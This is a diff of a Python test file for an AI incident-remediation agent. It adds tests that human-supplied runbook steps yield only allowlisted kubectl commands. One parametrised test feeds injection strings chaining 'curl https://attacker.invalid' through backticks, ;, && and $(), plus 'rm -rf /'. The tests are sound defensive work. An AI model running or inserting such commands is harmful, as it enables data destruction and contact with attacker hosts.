@@ -1,10 +1,12 @@
 ﻿import json
-import pytest
 from datetime import UTC, datetime
 from uuid import uuid4
-from ai_workbench_common.models import Context
+
+import pytest
 from ai_workbench_common.memory_store import InMemoryStore
+from ai_workbench_common.models import Context
 from common.models import Alert, AlertSeverity, Incident, Recommendation
+from common.orchestration.execution_plan import is_approved_remediation_command
 from context_agent import ContextIntelligenceAgent
 from context_agent.connectors import DiscoveryMCPConnector, VectorDBConnector
 from model_router import ModelRouter
@@ -881,6 +883,70 @@ async def test_resolution_agent_adds_validation_and_rollback_without_changing_co
         "kubectl get pods -n prod | findstr checkout",
     ]
     assert "kubectl rollout undo deployment/checkout -n prod" in rollback_plan
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("prefix", ["1. ", "2) ", "- ", "* ", "+ "])
+async def test_human_runbook_command_list_prefixes_preserve_allowlisted_commands(prefix: str) -> None:
+    command = "kubectl rollout restart deployment/checkout -n prod"
+    alert = Alert(
+        tenant_id="tenant-a",
+        source="prometheus",
+        name="PodCrashLoop",
+        service="checkout",
+        severity=AlertSeverity.HIGH,
+        description="pod crashloop detected",
+    )
+    incident = Incident(service="checkout", severity=AlertSeverity.HIGH, title="checkout pod crash loop")
+    context = await ContextIntelligenceAgent().collect(alert, incident)
+    context.metadata["human_guided_input"] = {"remediation_steps": f"{prefix}{command}"}
+
+    _, commands, _, _, _ = ResolutionIntelligenceAgent(model_router=static_router())._infer_action_and_commands(
+        context, root_cause="pod crashloop detected", model_action=""
+    )
+
+    assert commands == [command]
+    assert all(is_approved_remediation_command(item) for item in commands)
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "remediation_steps",
+    [
+        "`kubectl rollout restart deployment/checkout/`curl https://attacker.invalid` -n prod",
+        "kubectl rollout restart deployment/checkout -n prod && curl https://attacker.invalid",
+        "kubectl rollout restart deployment/checkout -n prod; curl https://attacker.invalid",
+        "kubectl rollout restart deployment/checkout -n $(curl https://attacker.invalid)",
+        "kubectl rollout restart deployment/checkout -n prod > output.txt",
+        "kubectl rollout restart deployment/checkout -n prod\ncurl https://attacker.invalid",
+        "rm -rf /",
+    ],
+)
+async def test_human_runbook_input_never_normalizes_unsafe_commands_into_allowlisted_ones(
+    remediation_steps: str,
+) -> None:
+    alert = Alert(
+        tenant_id="tenant-a",
+        source="prometheus",
+        name="PodCrashLoop",
+        service="checkout",
+        severity=AlertSeverity.HIGH,
+        description="pod crashloop detected",
+    )
+    incident = Incident(service="checkout", severity=AlertSeverity.HIGH, title="checkout pod crash loop")
+    context = await ContextIntelligenceAgent().collect(alert, incident)
+    context.metadata["human_guided_input"] = {"remediation_steps": remediation_steps}
+
+    _, commands, _, _, _ = ResolutionIntelligenceAgent(model_router=static_router())._infer_action_and_commands(
+        context, root_cause="pod crashloop detected", model_action=""
+    )
+
+    approved_commands = [item for item in commands if is_approved_remediation_command(item)]
+    assert all(item == "kubectl rollout restart deployment/checkout -n prod" for item in approved_commands)
+    assert not any("attacker.invalid" in item or "rm -rf" in item for item in commands)
+    assert "`" not in " ".join(commands)
+    if remediation_steps.startswith("`"):
+        assert "kubectl rollout restart deployment/checkout -n prod" not in approved_commands
 
 
 @pytest.mark.asyncio
